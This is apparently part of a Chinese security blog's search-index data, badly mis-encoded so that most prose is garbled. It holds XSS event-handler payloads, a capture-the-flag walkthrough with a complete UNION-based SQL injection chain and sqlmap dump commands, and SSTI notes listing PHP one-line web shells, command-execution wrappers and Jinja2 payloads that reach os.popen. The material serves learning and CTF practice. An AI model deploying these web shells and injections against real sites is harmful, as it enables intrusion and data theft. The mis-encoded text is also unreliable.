åº”è¯¥è‡ªåŠ¨è·å¾—ç„¦ç‚¹ã€‚å¯ä»¥é€šè¿‡autofocuså±æ€§è‡ªåŠ¨æ‰§è¡Œæœ¬èº«çš„focusäº‹ä»¶ï¼Œè¿™ä¸ªå‘é‡æ˜¯ä½¿ç„¦ç‚¹è‡ªåŠ¨è·³åˆ°è¾“å…¥å…ƒç´ ä¸Šï¼Œè§¦å‘ç„¦ç‚¹äº‹ä»¶ï¼Œæ— éœ€ç”¨æˆ·å»è§¦å‘ï¼š &lt;input onfocus=&quot;alert(1);&quot; autofocus&gt; &quot; Î¿nclick=alert(1)&gt;è¿™æ ·éœ€è¦ç‚¹å‡»ä¸€ä¸‹è¾“å…¥æ¡†&lt;br&gt; &quot; onmouseover=alert(1)&gt;éœ€è¦é¼ æ ‡åˆ’è¿‡è¾“å…¥æ¡†&lt;br&gt; ä¾‹å¦‚ï¼š &lt;?php ini_set(&quot;display_errors&quot;, 0); $str = $_GET[&quot;keyword&quot;]; echo &quot;&lt;h2 align=center&gt;æ²¡æœ‰æ‰¾åˆ°å’Œ&quot;.htmlspecialchars($str).&quot;ç›¸å…³çš„ç»“æœ.&lt;/h2&gt;&quot;.&#x27;&lt;center&gt; &lt;form action=level2.php method=GET&gt; &lt;input name=keyword value=&quot;&#x27;.$str.&#x27;&quot;&gt; &lt;input type=submit name=submit value=&quot;æœç´¢&quot;/&gt; &lt;/form&gt; &lt;/center&gt;&#x27;; ?&gt; åˆ†æä»£ç ï¼Œä»ç„¶æ˜¯ä½¿ç”¨getæ–¹æ³•ï¼Œä»urlä¸­æ¥å—ä¸€ä¸ªkeywordå‚æ•°ï¼Œä¸è¿‡è¿™é‡Œç”¨åˆ°ä¸€ä¸ªè¿‡æ»¤å‡½æ•°htmlspecialchars()ï¼Œè¿™ä¸ªå‡½æ•°æŠŠé¢„å®šä¹‰çš„å­—ç¬¦è½¬æ¢ä¸º HTML å®ä½“ï¼Œç­‰äº","categories":["å¸¸è§topæ¼æ´"]},{"title":"æ”»é˜²ä¸–ç•Œ-NewsCenter","path":"/2023/08/06/newscenter/","content":"é¢˜ç›®æè¿°ï¼š æ—  é¢˜ç›®è§£é¢˜ï¼š æ–¹æ³•ä¸€ï¼šæ‰‹å·¥æ³¨å…¥ è¿™é‡Œç¯å¢ƒå‡ºäº†é—®é¢˜ï¼Œæ€ä¹ˆåˆ·æ–°ä¹Ÿæ˜¾ç¤ºä¸äº†ï¼Œå°±è·Ÿç€wpèµ°ä¸€éå§ ç‚¹è¿›å»çœ‹åˆ°å¦‚ä¸‹é¡µé¢ æ¯•ç«Ÿå·²ç»çŸ¥é“æ˜¯sqlæ³¨å…¥äº†ï¼Œç›´æ¥çœ‹wpåˆ†æå§ï¼š çœ‹åˆ°æ•°æ®åŒ…æœ€ä¸‹æ–¹æœ‰ä¸ªPOSTæäº¤çš„ search =1ï¼Œçœ‹åˆ°è¿™é‡Œä¸çŸ¥é“å¤§å®¶æƒ³åˆ°äº†ä»€ä¹ˆæ²¡æœ‰ (æˆ‘ç¬¬ä¸€æ—¶é—´æ˜¯æƒ³åˆ°äº†sqlæ³¨å…¥) äºæ˜¯æˆ‘å»å°è¯•ï¼Œå› ä¸ºsearchæ¡†æ˜¯èƒ½è¾“å…¥å­—ç¬¦çš„æ‰€ä»¥åº”è¯¥å…ˆæƒ³ä»–ä¸ºå­—ç¬¦å‹æ³¨å…¥ï¼Œæˆ‘æ¯”è¾ƒä¹ æƒ¯äºç”¨ order by å»åˆ¤æ–­æ˜¯å¦æœ‰sqlæ³¨å…¥ äºæ˜¯åœ¨è¿™é‡Œæ„é€ search=1â€™ order by 3 --+ï¼Œburp suiteé‡Œå‘é€ç»™repeater å†å°è¯•search=1â€™ order by 4 --+ éå¸¸å¥½å‡ºç°é”™è¯¯äº†ï¼Œæ¥ä¸‹æ¥æ˜¯åˆ©ç”¨sqlæ³¨å…¥çš„è”åˆæŸ¥è¯¢ search=-1â€™ union select 1,2,3 --+ //è¿™é‡Œ-1æ˜¯ä¸ºäº†ä¸å ç”¨å›æ˜¾ä½ åˆ¤æ–­å›æ˜¾ä½ä¸º2,3 ç„¶åsearch=-1â€™ union select 1,version(),database() --+ è·å–sqlç‰ˆæœ¬å’Œå½“å‰æ•°æ®åº“å è¿™é‡Œä¸ºä»€ä¹ˆè¦è·å–æ•°æ®åº“ç‰ˆæœ¬å‘¢å› ä¸ºmysqlå¤§äº5.0ä»¥ä¸Šçš„ç‰ˆæœ¬æœ‰ä¸€ä¸ª ç³»ç»Ÿæ•°æ®åº“information_schemaé‡Œé¢çš„tablesè¡¨å’Œcolumnsè¡¨åŒ…å«äº†å…¶ä»–æ‰€æœ‰çš„è¡¨å’Œåˆ—è¿™æ ·æˆ‘ä»¬å°±å¯ä»¥æœ‰æ®æŸ¥è¯¢ å¹¶ä¸”è¿™é‡ŒçŸ¥é“äº†å½“å‰æ•°æ®åº“ä¸ºnews ç„¶åå†æ„é€ sqlè¯­å¥ search=-1â€™ union select 1,version(),group_concat(table_name) from information_schema.tables where table_schema=â€˜newsâ€™ --+ è¿™é‡Œå¯ä»¥çœ‹åˆ°æœ‰ä¸¤ä¸ªè¡¨newsï¼Œå’Œsecret_tableï¼Œnewsåº”è¯¥å°±æ˜¯é¡µé¢ä¸Šçš„é‚£äº›æ‰€ä»¥æˆ‘ä»¬å»æ‰¾flagè¦ä»secret_tableè¡¨ä¸­å»æ‰¾ å†æ„é€ sqlè¯­å¥ search=-1â€™ union select 1,version(),group_concat(column_name) from information_schema.columns where table_name=â€˜secret_tableâ€™ --+ çœ‹åˆ°æœ‰ä¸¤ä¸ªåˆ—id,fl4gç­”æ¡ˆåº”è¯¥å°±åœ¨fl4gé‡Œé¢äº† æœ€åçš„sqlè¯­å¥ search=-1â€™ union select 1,version(),group_concat(fl4g) from secret_table --+ æ–¹æ³•äºŒï¼šsqlmap æœç´¢æ¡†ä¸­å¡«å…¥å†…å®¹ï¼Œå¦‚â€˜1â€™ï¼Œå›è½¦æœç´¢æŠ“åŒ…ï¼Œå°†æŠ“åˆ°åŒ…çš„å†…å®¹ä¿å­˜åœ¨txtæ–‡æ¡£é‡Œ ä½¿ç”¨sqlmapçš„-rè¿›è¡Œæ³¨å…¥å¦‚ä¸‹ï¼Œå…¶ä¸­C:\\Users\\xxx\\Desktop\\1.txtä¸ºä¿å­˜æ•°æ®åŒ…çš„txtæ–‡ä»¶ç»å¯¹è·¯å¾„ #æŸ¥æ‰¾æ•°æ®åº“ sqlmap.py -r â€œC:\\Users\\xxx\\Desktop\\1.txtâ€ --dbs #æˆ–æŸ¥æ‰¾å½“å‰æ•°æ®åº“ sqlmap.py -r â€œC:\\Users\\xxx\\Desktop\\1.txtâ€ --current-dbs #æŸ¥æ‰¾newsæ•°æ®åº“ä¸­çš„è¡¨ sqlmap.py -r â€œC:\\Users\\xxx\\Desktop\\1.txtâ€ -D news --tables #æŸ¥æ‰¾secret_tableè¡¨ä¸­çš„åˆ— sqlmap.py -r â€œC:\\Users\\xxx\\Desktop\\1.txtâ€ -D news -T serect_table --columns #æŸ¥æ‰¾fl4gåˆ—ä¸­çš„å­—æ®µï¼ˆå†…å®¹ï¼‰ï¼Œå‡ºç°flag sqlmap.py -r â€œC:\\Users\\xxx\\Desktop\\1.txtâ€ -D news -T serect_table -C fl4g --dump æ€ä¹ˆè¯´ï¼Œæ²¡æœ‰è¿‡æ»¤ï¼Œå¾ˆæ–°æ‰‹ å‚è€ƒæ–‡ç« ï¼š æ–¹æ³•ä¸€å‚è€ƒ æ–¹æ³•äºŒå‚è€ƒ","categories":["æ”»é˜²ä¸–ç•Œ"]},{"title":"æµ…æSSTIæ¼æ´","path":"/2023/08/06/qian-xi-ssti-lou-dong/","content":"SSTIæ³¨å…¥å§¿åŠ¿ ä¸€ã€å¸¸è§ä»£ç æ‰§è¡Œå‡½æ•° ä»£ç æ‰§è¡Œå‡½æ•°ä¸»è¦æœ‰ï¼ˆ9ä¸ªï¼‰ï¼ševal()ï¼Œassert()ï¼Œcall_user_func()ï¼Œcreate_function()ï¼Œarray_map()ï¼Œcall_user_func_array()ï¼Œarray_filter()ï¼Œuasort()ï¼Œpreg_replace() 1- eval() ä¼ å…¥çš„å‚æ•°å¿…é¡»ä¸ºPHPä»£ç ï¼Œå³éœ€è¦ä»¥åˆ†å·ç»“å°¾ã€‚ å‘½ä»¤åŸ·è¡Œï¼šcmd=system(whoami); èœåˆ€è¿æ¥å¯†ç ï¼šcmd &lt;?php @eval($_POST['cmd']);?&gt; ç‰¹åˆ«æ³¨æ„ï¼šphpä¸­@æ˜¯å¹²ä»€ä¹ˆçš„ å±è”½æ‰å‡ºé”™ä¿¡æ¯,æœ‰@æ—¶å°±ç®—è¿æ¥å‡ºé”™,ä¹Ÿä¸ä¼šæŠ¥é”™çš„ åŸå› æ˜¯é˜²æ­¢åˆ«äººæ ¹æ®é”™è¯¯æç¤ºä¿¡æ¯æ¥æ¨æµ‹å‡ºä½ çš„æ•°æ®åº“ç»“æ„è¿›è¡Œæ³¨å…¥æ”»å‡»ä¸€ç±»çš„é»‘å®¢è¡Œä¸º 2- assert() --ï¼ˆæœ€å¥½ä¸è¦åŠ ä¸Šåˆ†å·ä½œä¸ºç»“å°¾ï¼‰ assertå‡½æ•°æ˜¯ç›´æ¥å°†ä¼ å…¥çš„å‚æ•°å½“æˆPHPä»£ç ï¼Œä¸éœ€è¦ä»¥åˆ†å·ç»“å°¾ï¼ˆç‰¹åˆ«æ³¨æ„ï¼‰ï¼Œæœ‰æ—¶åŠ ä¸Šåˆ†å·ä¸ä¼šæ˜¾ç¤ºç»“æœã€‚ å‘½ä»¤åŸ·è¡Œï¼šcmd=system(whoami) èœåˆ€è¿æ¥å¯†ç ï¼šcmd &lt;?php @assert($_POST['cmd'])?&gt; 3- call_user_func() ä¼ å…¥çš„å‚æ•°ä½œä¸ºassertå‡½æ•°çš„å‚æ•° å‘½ä»¤æ‰§è¡Œï¼šcmd=system(whoami) èœåˆ€è¿æ¥å¯†ç ï¼šcmd &lt;?php call_user_func(\"assert\",$_POST['cmd']); ?&gt; &lt;?php call_user_func($_POST[\"fun\"],$_POST[\"para\"]) ?&gt; //post:fun=assert&amp;para=phpinfo(); 4- create_function() åˆ›å»ºåŒ¿åå‡½æ•°æ‰§è¡Œä»£ç  æ‰§è¡Œå‘½ä»¤å’Œä¸Šä¼ æ–‡ä»¶å‚è€ƒevalå‡½æ•°(å¿…é¡»åŠ åˆ†å·)ã€‚ &lt;?php $func =create_function('',$_POST['cmd']);$func(); ?&gt; &lt;?php $a= $_POST['func']; $b = create_function('$a',\"echo $a\"); $b(''); ?&gt; //post:func=phpinfo(); 5- array_map() array_map() å‡½æ•° å°†ç”¨æˆ·è‡ªå®šä¹‰å‡½æ•°ä½œç”¨åˆ°æ•°ç»„ä¸­çš„æ¯ä¸ªå€¼ä¸Šï¼Œå¹¶è¿”å›ç”¨æˆ·è‡ªå®šä¹‰å‡½æ•°ä½œç”¨åçš„å¸¦æœ‰æ–°å€¼çš„æ•°ç»„ã€‚ å›è°ƒå‡½æ•°æ¥å—çš„å‚æ•°æ•°ç›®åº”è¯¥å’Œä¼ é€’ç»™ array_map() å‡½æ•°çš„æ•°ç»„æ•°ç›®ä¸€è‡´ã€‚ å‘½ä»¤æ‰§è¡Œhttp://localhost/123.php?func=system cmd=whoami èœåˆ€è¿æ¥http://localhost/123.php?func=assert å¯†ç ï¼šcmd &lt;?php $func=$_GET['func']; $cmd=$_POST['cmd']; $array[0]=$cmd; $new_array=array_map($func,$array); echo $new_array; ?&gt; 6- call_user_func_array() å°†ä¼ å…¥çš„å‚æ•°ä½œä¸ºæ•°ç»„çš„ç¬¬ä¸€ä¸ªå€¼ä¼ é€’ç»™assertå‡½æ•° cmd=system(whoami) èœåˆ€è¿æ¥å¯†ç ï¼šcmd &lt;?php $cmd=$_POST['cmd']; $array[0]=$cmd; call_user_func_array(\"assert\",$array); ?&gt; 7- array_filter() ç”¨å›è°ƒå‡½æ•°è¿‡æ»¤æ•°ç»„ä¸­çš„å…ƒç´ ï¼šarray_filter(æ•°ç»„,å‡½æ•°) å‘½ä»¤æ‰§è¡Œfunc=system&amp;cmd=whoami èœåˆ€è¿æ¥http://localhost/123.php?func=assert å¯†ç cmd &lt;?php $cmd=$_POST['cmd']; $array1=array($cmd); $func =$_GET['func']; array_filter($array1,$func); ?&gt; 8- uasort()å‡½æ•° phpç¯å¢ƒ&gt;=&lt;5.6æ‰èƒ½ç”¨ uasort() ä½¿ç”¨ç”¨æˆ·è‡ªå®šä¹‰çš„æ¯”è¾ƒå‡½æ•°å¯¹æ•°ç»„ä¸­çš„å€¼è¿›è¡Œæ’åºå¹¶ä¿æŒç´¢å¼•å…³è” ã€‚ å‘½ä»¤æ‰§è¡Œï¼šhttp://localhost/123.php?1=1+1&amp;2=eval($_GET[cmd])&amp;cmd=system(whoami); èœåˆ€è¿æ¥ï¼šhttp://localhost/123.php?1=1+1&amp;2=eval($_POST[cmd]) å¯†ç ï¼šcmd &lt;?php usort($_GET,'asse'.'rt'); ?&gt; 9- preg_replace() preg_replace('æ­£åˆ™è§„åˆ™','æ›¿æ¢å­—ç¬¦'ï¼Œ'ç›®æ ‡å­—ç¬¦') æ‰§è¡Œå‘½ä»¤å’Œä¸Šä¼ æ–‡ä»¶å‚è€ƒassertå‡½æ•°(ä¸éœ€è¦åŠ åˆ†å·)ã€‚ å°†ç›®æ ‡å­—ç¬¦ä¸­ç¬¦åˆæ­£åˆ™è§„åˆ™çš„å­—ç¬¦æ›¿æ¢ä¸ºæ›¿æ¢å­—ç¬¦ï¼Œæ­¤æ—¶å¦‚æœæ­£åˆ™è§„åˆ™ä¸­ä½¿ç”¨/eä¿®é¥°ç¬¦ï¼Œåˆ™å­˜åœ¨ä»£ç æ‰§è¡Œæ¼æ´ã€‚ &lt;?php preg_replace(\"/test/e\",$_POST[\"cmd\"],\"jutst test\"); ?&gt; è¿™é‡Œå¯ä»¥ä½¿ç”¨chr()å‡½æ•°è½¬æ¢ASCIIç¼–ç æ¥æ‰§è¡Œä»£ç ã€‚ #phpinfo(); eval(chr(112).chr(104).chr(112).chr(105).chr(110).chr(102).chr(111).chr(40).chr(41).chr(59)) äºŒã€å¸¸è§å‘½ä»¤æ‰§è¡Œå‡½æ•° *å‘½ä»¤æ‰§è¡Œå‡½æ•°ä¸»è¦æœ‰ï¼ˆ7ä¸ªï¼‰ï¼šsystem()ï¼Œpassthru()ï¼Œexec()ï¼Œpcntl_exec()ï¼Œshell_exec()ï¼Œpopen()/proc_popen()ï¼Œåå¼•å· `` 1- system() ä½œç”¨ å°†å­—ç¬¦ä¸²ä½œä¸ºOSå‘½ä»¤æ‰§è¡Œï¼Œè‡ªå¸¦è¾“å‡ºåŠŸèƒ½ã€‚ &lt;?php system($_POST[\"cmd\"]);?&gt; 2-passthru() ä½œç”¨ å°†å­—ç¬¦ä¸²ä½œä¸ºOSå‘½ä»¤æ‰§è¡Œï¼Œä¸éœ€è¦è¾“å‡ºæ‰§è¡Œç»“æœï¼Œä¸”è¾“å‡ºå…¨éƒ¨çš„å†…å®¹ã€‚ &lt;?php passthru($_POST[\"cmd\"]);?&gt; 3- exec() ä½œç”¨ å°†å­—ç¬¦ä¸²ä½œä¸ºOSå‘½ä»¤æ‰§è¡Œï¼Œéœ€è¦è¾“å‡ºæ‰§è¡Œç»“æœï¼Œä¸”å®ƒåªä¼šè¾“å‡ºæœ€åä¸€è¡Œçš„å†…å®¹ã€‚ &lt;?php echo exec($_POST[\"cmd\"]);?&gt; &lt;?php print exec($_POST[\"cmd\"]);?&gt; //ä»–çš„è¾“å‡ºç»“æœéœ€è¦æ‰“å°ï¼Œsystem()ä¸ç”¨æ‰“å° 4- pcntl_exec() linux: &lt;?php pcntl_exec(\"/bin/bash\",array($_POST[\"cmd\"])); ?&gt; ç”¨çš„ä¸å¤šã€‚æš‚æ—¶ç•¥è¿‡ã€‚ 5- shell_exec() ä½œç”¨ å°†å­—ç¬¦ä¸²ä½œä¸ºOSå‘½ä»¤æ‰§è¡Œï¼Œéœ€è¦è¾“å‡ºæ‰§è¡Œç»“æœï¼Œä¸”è¾“å‡ºå…¨éƒ¨çš„å†…å®¹ã€‚ &lt;?php echo shell_exec($_POST[\"cmd\"]); ?&gt; &lt;?php print shell_exec($_POST[\"cmd\"]); ?&gt; 6- popen()/proc_open() ä½œç”¨ è¯¥å‡½æ•°ä¹Ÿå¯ä»¥å°†å­—ç¬¦ä¸²å½“ä½œOSå‘½ä»¤æ¥æ‰§è¡Œï¼Œä½†æ˜¯è¯¥å‡½æ•°è¿”å›çš„æ˜¯æ–‡ä»¶æŒ‡é’ˆè€Œéå‘½ä»¤æ‰§è¡Œç»“æœã€‚è¯¥å‡½æ•°æœ‰ä¸¤ä¸ªå‚æ•°ã€‚ linux: &lt;?php $handle = popen(\"/bin/ls\",\"r\");?&gt; windows: &lt;?php $cmd = $_POST['cmd'].\"&gt;&gt; 1.txt\"; //æ­¤æ—¶çš„$cmd=ipconfig &gt;&gt; 1.txt popen(\"$cmd\",'r'); //å®é™…ä¸Šå°±æ˜¯ popen(\"ipconfig &gt;&gt; 1.txt\", \"r\"),æŠŠæ‰§è¡Œç»“æœæ”¾å…¥1.txtæ–‡ä»¶ï¼Œé€šè¿‡è®¿é—®1.txtæ–‡ä»¶æŸ¥çœ‹æ‰§è¡Œç»“æœã€‚ ?&gt; 7- åå¼•å· `` ä½œç”¨ [``]åå¼•å·é‡Œé¢çš„ä»£ç ä¹Ÿä¼šè¢«å½“ä½œOSå‘½ä»¤æ¥æ‰§è¡Œ &lt;?php echo `whoami`?&gt; æˆ–è€…ï¼š &lt;?php $cmd = $_GET['cmd'];print `$cmd`; ?&gt; è¯¦è§£æŸ¥çœ‹https://blog.csdn.net/weixin_39934520/article/details/109231480?ops_request_misc=&amp;request_id=&amp;biz_id=102&amp;utm_term=popenæ˜¯å¹²ä»€ä¹ˆçš„&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-1-109231480.nonecase&amp;spm=1018.2226.3001.4187 ä¸‰ã€æ³¨å…¥æµç¨‹ä»¥åŠå¿…è¦å‡½æ•°çš„ç”¨æ³• å˜é‡å— {{}}\tç”¨äºå°†è¡¨è¾¾å¼æ‰“å°åˆ°æ¨¡æ¿è¾“å‡º æ³¨é‡Šå— {##}\tæ³¨é‡Š æ§åˆ¶å—\t{%%}\tå¯ä»¥å£°æ˜å˜é‡ï¼Œä¹Ÿå¯ä»¥æ‰§è¡Œè¯­å¥ è¡Œå£°æ˜\t## å¯ä»¥æœ‰å’Œ{%%}ç›¸åŒçš„æ•ˆæœ __class__ ç±»çš„ä¸€ä¸ªå†…ç½®å±æ€§ï¼Œè¡¨ç¤ºå®ä¾‹å¯¹è±¡çš„ç±»ã€‚ __base__ ç±»å‹å¯¹è±¡çš„ç›´æ¥åŸºç±» __bases__ ç±»å‹å¯¹è±¡çš„å…¨éƒ¨åŸºç±»ï¼Œä»¥å…ƒç»„å½¢å¼ï¼Œç±»å‹çš„å®ä¾‹é€šå¸¸æ²¡æœ‰å±æ€§ __bases__ __mro__ æ­¤å±æ€§æ˜¯ç”±ç±»ç»„æˆçš„å…ƒç»„ï¼Œåœ¨æ–¹æ³•è§£ææœŸé—´ä¼šåŸºäºå®ƒæ¥æŸ¥æ‰¾åŸºç±»ã€‚ __subclasses__() è¿”å›è¿™ä¸ªç±»çš„å­ç±»é›†åˆï¼ŒEach class keeps a list of weak references to its immediate subclasses. This method returns a list of all those references still alive. The list is in definition order. __init__ åˆå§‹åŒ–ç±»ï¼Œè¿”å›çš„ç±»å‹æ˜¯function __globals__ ä½¿ç”¨æ–¹å¼æ˜¯ å‡½æ•°å.__globals__è·å–functionæ‰€å¤„ç©ºé—´ä¸‹å¯ä½¿ç”¨çš„moduleã€æ–¹æ³•ä»¥åŠæ‰€æœ‰å˜é‡ã€‚ __dic__ ç±»çš„é™æ€å‡½æ•°ã€ç±»å‡½æ•°ã€æ™®é€šå‡½æ•°ã€å…¨å±€å˜é‡ä»¥åŠä¸€äº›å†…ç½®çš„å±æ€§éƒ½æ˜¯æ”¾åœ¨ç±»çš„__dict__é‡Œ __getattribute__() å®ä¾‹ã€ç±»ã€å‡½æ•°éƒ½å…·æœ‰çš„__getattribute__é­”æœ¯æ–¹æ³•ã€‚äº‹å®ä¸Šï¼Œåœ¨å®ä¾‹åŒ–çš„å¯¹è±¡è¿›è¡Œ.æ“ä½œçš„æ—¶å€™ï¼ˆå½¢å¦‚ï¼ša.xxx/a.xxx()ï¼‰ï¼Œéƒ½ä¼šè‡ªåŠ¨å»è°ƒç”¨__getattribute__æ–¹æ³•ã€‚å› æ­¤æˆ‘ä»¬åŒæ ·å¯ä»¥ç›´æ¥é€šè¿‡è¿™ä¸ªæ–¹æ³•æ¥è·å–åˆ°å®ä¾‹ã€ç±»ã€å‡½æ•°çš„å±æ€§ã€‚ __getitem__() è°ƒç”¨å­—å…¸ä¸­çš„é”®å€¼ï¼Œå…¶å®å°±æ˜¯è°ƒç”¨è¿™ä¸ªé­”æœ¯æ–¹æ³•ï¼Œæ¯”å¦‚a['b']ï¼Œå°±æ˜¯a.__getitem__('b') __builtins__ å†…å»ºåç§°ç©ºé—´ï¼Œå†…å»ºåç§°ç©ºé—´æœ‰è®¸å¤šåå­—åˆ°å¯¹è±¡ä¹‹é—´æ˜ å°„ï¼Œè€Œè¿™äº›åå­—å…¶å®å°±æ˜¯å†…å»ºå‡½æ•°çš„åç§°ï¼Œå¯¹è±¡å°±æ˜¯è¿™äº›å†…å»ºå‡½æ•°æœ¬èº«ã€‚å³é‡Œé¢æœ‰å¾ˆå¤šå¸¸ç”¨çš„å‡½æ•°ã€‚__builtins__ä¸__builtin__çš„åŒºåˆ«å°±ä¸æ”¾äº†ï¼Œç™¾åº¦éƒ½æœ‰ã€‚ __import__ åŠ¨æ€åŠ è½½ç±»å’Œå‡½æ•°ï¼Œä¹Ÿå°±æ˜¯å¯¼å…¥æ¨¡å—ï¼Œç»å¸¸ç”¨äºå¯¼å…¥osæ¨¡å—ï¼Œ__import__('os').popen('ls').read()] __str__() è¿”å›æå†™è¿™ä¸ªå¯¹è±¡çš„å­—ç¬¦ä¸²ï¼Œå¯ä»¥ç†è§£æˆå°±æ˜¯æ‰“å°å‡ºæ¥ã€‚ url_for flaskçš„ä¸€ä¸ªæ–¹æ³•ï¼Œå¯ä»¥ç”¨äºå¾—åˆ°__builtins__ï¼Œè€Œä¸”url_for.__globals__['__builtins__']å«æœ‰current_appã€‚ get_flashed_messages flaskçš„ä¸€ä¸ªæ–¹æ³•ï¼Œå¯ä»¥ç”¨äºå¾—åˆ°__builtins__ï¼Œè€Œä¸”url_for.__globals__['__builtins__']å«æœ‰current_appã€‚ lipsum flaskçš„ä¸€ä¸ªæ–¹æ³•ï¼Œå¯ä»¥ç”¨äºå¾—åˆ°__builtins__ï¼Œè€Œä¸”lipsum.__globals__å«æœ‰osæ¨¡å—ï¼š{{lipsum.__globals__['os'].popen('ls').read()}} current_app åº”ç”¨ä¸Šä¸‹æ–‡ï¼Œä¸€ä¸ªå…¨å±€å˜é‡ã€‚ request å¯ä»¥ç”¨äºè·å–å­—ç¬¦ä¸²æ¥ç»•è¿‡ï¼ŒåŒ…æ‹¬ä¸‹é¢è¿™äº›ï¼Œå¼•ç”¨ä¸€ä¸‹ç¾½å¸ˆå‚…çš„ã€‚æ­¤å¤–ï¼ŒåŒæ ·å¯ä»¥è·å–openå‡½æ•°:request.__init__.__globals__['__builtins__'].open('/proc\\self\\fd/3').read() request.args.x1 getä¼ å‚ request.values.x1 æ‰€æœ‰å‚æ•° request.cookies cookieså‚æ•° request.headers è¯·æ±‚å¤´å‚æ•° request.form.x1 postä¼ å‚\t(Content-Type:applicaation/x-www-form-urlencodedæˆ–multipart/form-data) request.data postä¼ å‚\t(Content-Type:a/b) request.json postä¼ json (Content-Type: application/json) config å½“å‰applicationçš„æ‰€æœ‰é…ç½®ã€‚æ­¤å¤–ï¼Œä¹Ÿå¯ä»¥è¿™æ ·{{config.__class__.__init__.__globals__['os'].popen('ls').read() }} g {{g}}å¾—åˆ°&lt;flask.g of 'flask_ssti'&gt; int() å°†å€¼è½¬æ¢ä¸ºintç±»å‹ï¼› float() å°†å€¼è½¬æ¢ä¸ºfloatç±»å‹ï¼› lower() å°†å­—ç¬¦ä¸²è½¬æ¢ä¸ºå°å†™ï¼› upper() å°†å­—ç¬¦ä¸²è½¬æ¢ä¸ºå¤§å†™ï¼› title() æŠŠå€¼ä¸­çš„æ¯ä¸ªå•è¯çš„é¦–å­—æ¯éƒ½è½¬æˆå¤§å†™ï¼› capitalize()\tæŠŠå˜é‡å€¼çš„é¦–å­—æ¯è½¬æˆå¤§å†™ï¼Œå…¶ä½™å­—æ¯è½¬å°å†™ï¼› trim() æˆªå–å­—ç¬¦ä¸²å‰é¢å’Œåé¢çš„ç©ºç™½å­—ç¬¦ï¼› wordcount()\tè®¡ç®—ä¸€ä¸ªé•¿å­—ç¬¦ä¸²ä¸­å•è¯çš„ä¸ªæ•°ï¼› reverse()\tå­—ç¬¦ä¸²åè½¬ï¼› replace(value,old,new)\tæ›¿æ¢å°†oldæ›¿æ¢ä¸ºnewçš„å­—ç¬¦ä¸²ï¼› truncate(value,length=255,killwords=False)\tæˆªå–lengthé•¿åº¦çš„å­—ç¬¦ä¸²ï¼› striptags()\tåˆ é™¤å­—ç¬¦ä¸²ä¸­æ‰€æœ‰çš„HTMLæ ‡ç­¾ï¼Œå¦‚æœå‡ºç°å¤šä¸ªç©ºæ ¼ï¼Œå°†æ›¿æ¢æˆä¸€ä¸ªç©ºæ ¼ï¼› escape()æˆ–e\tè½¬ä¹‰å­—ç¬¦ï¼Œä¼šå°†&lt;ã€&gt;ç­‰ç¬¦å·è½¬ä¹‰æˆHTMLä¸­çš„ç¬¦å·ã€‚æ˜¾ä¾‹ï¼šcontent|escapeæˆ–content|eã€‚ safe() ç¦ç”¨HTMLè½¬ä¹‰ï¼Œå¦‚æœå¼€å¯äº†å…¨å±€è½¬ä¹‰ï¼Œé‚£ä¹ˆsafeè¿‡æ»¤å™¨ä¼šå°†å˜é‡å…³æ‰è½¬ä¹‰ã€‚ç¤ºä¾‹ï¼š {{'&lt;em&gt;hello&lt;/em&gt;'|safe}}ï¼› list() å°†å˜é‡åˆ—æˆåˆ—è¡¨ï¼› string()\tå°†å˜é‡è½¬æ¢æˆå­—ç¬¦ä¸²ï¼› join() å°†ä¸€ä¸ªåºåˆ—ä¸­çš„å‚æ•°å€¼æ‹¼æ¥æˆå­—ç¬¦ä¸²ã€‚ç¤ºä¾‹çœ‹ä¸Šé¢payloadï¼› abs() è¿”å›ä¸€ä¸ªæ•°å€¼çš„ç»å¯¹å€¼ï¼› first() è¿”å›ä¸€ä¸ªåºåˆ—çš„ç¬¬ä¸€ä¸ªå…ƒç´ ï¼› last() è¿”å›ä¸€ä¸ªåºåˆ—çš„æœ€åä¸€ä¸ªå…ƒç´ ï¼› format(value,arags,*kwargs)\tæ ¼å¼åŒ–å­—ç¬¦ä¸²ã€‚æ¯”å¦‚ï¼š{{\"%s\" - \"%s\"|format('Hello?',\"Foo!\") }}å°†è¾“å‡ºï¼šHelloo? - Foo! length()\tè¿”å›ä¸€ä¸ªåºåˆ—æˆ–è€…å­—å…¸çš„é•¿åº¦ï¼› sum() è¿”å›åˆ—è¡¨å†…æ•°å€¼çš„å’Œï¼› sort() è¿”å›æ’åºåçš„åˆ—è¡¨ï¼› default(value,default_value,boolean=false)\tå¦‚æœå½“å‰å˜é‡æ²¡æœ‰å€¼ï¼Œåˆ™ä¼šä½¿ç”¨å‚æ•°ä¸­çš„å€¼æ¥ä»£æ›¿ã€‚ç¤ºä¾‹ï¼š name|default('xiaotuo')----å¦‚æœnameä¸å­˜åœ¨ï¼Œåˆ™ä¼šä½¿ç”¨xiaotuoæ¥æ›¿ä»£ã€‚boolean=Falseé»˜è®¤æ˜¯åœ¨åªæœ‰è¿™ä¸ªå˜é‡ä¸ºundefinedçš„æ—¶å€™æ‰ä¼šä½¿ç”¨defaultä¸­çš„å€¼ï¼Œå¦‚æœæƒ³ä½¿ç”¨pythonçš„å½¢å¼åˆ¤æ–­æ˜¯å¦ä¸ºfalseï¼Œåˆ™å¯ä»¥ä¼ é€’boolean=trueã€‚ä¹Ÿå¯ä»¥ä½¿ç”¨oræ¥æ›¿æ¢ã€‚ length()\tè¿”å›å­—ç¬¦ä¸²çš„é•¿åº¦ï¼Œåˆ«åæ˜¯count 2.1. åˆè¯†SSTI 1. ä»€ä¹ˆæ˜¯SSTIï¼Ÿ SSTIå°±æ˜¯æœåŠ¡å™¨ç«¯æ¨¡æ¿æ³¨å…¥(Server-Side Template Injection)ï¼Œå®é™…ä¸Šä¹Ÿæ˜¯ä¸€ç§æ³¨å…¥æ¼æ´ã€‚ å¯èƒ½SSTIå¯¹å¤§å®¶è€Œè¨€ä¸æ˜¯å¾ˆç†Ÿæ‚‰ï¼Œä½†æ˜¯ç›¸ä¿¡å¤§å®¶å¾ˆç†Ÿæ‚‰SQLæ³¨å…¥ã€‚å®é™…ä¸Šè¿™ä¸¤è€…çš„æ€è·¯éƒ½æ˜¯ç›¸åŒçš„ï¼Œå› æ­¤å¯ä»¥ç±»æ¯”æ¥åˆ†æã€‚ 2. render_templateæ¸²æŸ“å‡½æ•°æ˜¯ä»€ä¹ˆ å°±æ˜¯æŠŠHTMLæ¶‰åŠçš„é¡µé¢ä¸ç”¨æˆ·æ•°æ®åˆ†ç¦»å¼€ï¼Œè¿™æ 